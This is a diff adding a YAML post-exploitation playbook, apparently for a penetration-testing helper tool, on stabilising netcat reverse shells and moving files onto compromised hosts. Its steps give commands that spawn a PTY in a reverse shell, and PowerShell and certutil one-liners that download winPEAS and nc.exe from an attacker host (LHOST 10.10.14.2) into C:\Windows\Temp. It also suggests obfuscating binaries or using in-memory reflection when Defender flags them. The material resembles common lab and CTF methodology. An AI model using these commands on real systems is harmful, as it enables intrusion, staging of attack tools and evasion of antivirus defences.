@@ -1,0 +1,66 @@
+id: shells-transfer
+name: TTY Shell Stabilization & File Transfers
+category: post-exploitation
+description: Techniques for upgrading raw netcat reverse shells to full interactive PTY sessions (with tab completion, arrows, and Ctrl+C support) and transferring files on Windows and Linux.
+requires_shell: true
+port_triggers: []
+tags:
+  - tty
+  - pty
+  - file-transfer
+  - powershell
+  - certutil
+steps:
+  - id: tty-pty-upgrade
+    title: Python Interactive PTY Spawn
+    phase: post-exploitation
+    purpose: Spawn a pseudo-terminal (PTY) inside a raw netcat reverse shell.
+    command: python3 -c "import pty; pty.spawn('/bin/bash')"
+    expected_output:
+      - user@target:~$
+    common_mistakes:
+      - If python3 is missing, try `python -c ...` or `script /dev/null -c bash`.
+    if_success: PTY spawned! Next background with `Ctrl+Z` and run `stty raw -echo; fg`.
+    if_failure: No python found. Try `script -qc /bin/bash /dev/null`.
+    references:
+      - https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-tty
+  - id: tty-stty-raw
+    title: Raw Terminal & Window Resize (Ctrl+Z -> fg)
+    phase: post-exploitation
+    purpose: Pass raw keystrokes (Ctrl+C, nano, vim, tab completion) directly to the target reverse shell without killing your netcat listener.
+    command: stty raw -echo; fg; export TERM=xterm-256color; stty rows 38 columns 116
+    expected_output:
+      - '[Terminal fully interactive with clear, tab completion, and Ctrl+C safety]'
+    common_mistakes:
+      - Type `reset` if terminal formatting breaks after typing `fg`.
+    if_success: Fully stabilized Linux TTY shell ready for operation.
+    if_failure: Check your local terminal rows/columns with `stty size`.
+    references:
+      - https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-tty
+  - id: transfer-win-iwr
+    title: Windows PowerShell File Download (Invoke-WebRequest)
+    phase: post-exploitation
+    purpose: Download tools (winPEAS, Mimikatz, Chisel) directly into `C:\Windows\Temp\` using PowerShell.
+    command: powershell -c "Invoke-WebRequest -Uri 'http://{{LHOST|10.10.14.2}}:8000/winPEASx64.exe' -OutFile 'C:\Windows\Temp\winPEAS.exe'"
+    expected_output:
+      - '[File downloaded to C:\Windows\Temp\winPEAS.exe]'
+    common_mistakes:
+      - Always download to `C:\Windows\Temp\` or `C:\Users\Public\` which are writable by all users.
+    if_success: File downloaded! Execute with `C:\Windows\Temp\winPEAS.exe`.
+    if_failure: PowerShell blocked or restricted. Try `certutil.exe`.
+    references:
+      - https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-file-transfer
+  - id: transfer-win-certutil
+    title: Windows Certutil Download (Fallback)
+    phase: post-exploitation
+    purpose: Download files using the native built-in Windows Certificate Utility when PowerShell is restricted.
+    command: certutil.exe -urlcache -split -f http://{{LHOST|10.10.14.2}}:8000/nc.exe C:\Windows\Temp\nc.exe
+    expected_output:
+      - '****  Online  ****'
+      - 'CertUtil: -URLCache command completed successfully.'
+    common_mistakes:
+      - Run `certutil -urlcache -split -f http://... delete` to clear cache artifacts if needed.
+    if_success: Tool downloaded successfully via CertUtil.
+    if_failure: Antivirus Defender signature detection. Obfuscate binary or use in-memory reflection.
+    references:
+      - https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-file-transfer
